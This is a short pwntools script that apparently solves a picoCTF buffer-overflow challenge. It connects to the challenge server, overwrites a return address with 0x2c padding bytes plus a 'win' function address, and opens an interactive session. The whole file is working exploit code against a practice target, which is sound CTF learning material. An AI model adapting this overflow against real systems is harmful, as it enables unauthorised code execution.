from pwn import *
# p = process('./vuln')
p = remote("saturn.picoctf.net", 53466)
elf = ELF('./vuln')

p.recvuntil("string:")
addr_win = 0x080491f6
payload = "A" * 0x2c + p32(addr_win)
p.sendline(payload)

p.interactive()




